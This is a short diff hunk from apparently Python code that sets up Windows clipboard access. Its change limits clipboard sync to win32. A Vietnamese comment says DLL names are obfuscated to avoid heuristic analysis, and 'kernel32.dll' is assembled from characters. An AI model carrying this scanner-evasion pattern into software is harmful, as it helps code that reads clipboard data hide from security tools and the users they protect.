@@ -36,7 +36,7 @@ fn_SetClipboardData = None
 fn_IsClipboardFormatAvailable = None
 fn_DragQueryFileW = None
 
-if ENABLE_CLIPBOARD_SYNC:
+if ENABLE_CLIPBOARD_SYNC and sys.platform == "win32":
     try:
         # Tải động các DLL bằng tên mã hóa nhẹ để tránh phân tích heuristic
         k32_lib = "".join(["k", "e", "r", "n", "e", "l", "3", "2", ".d", "l", "l"])
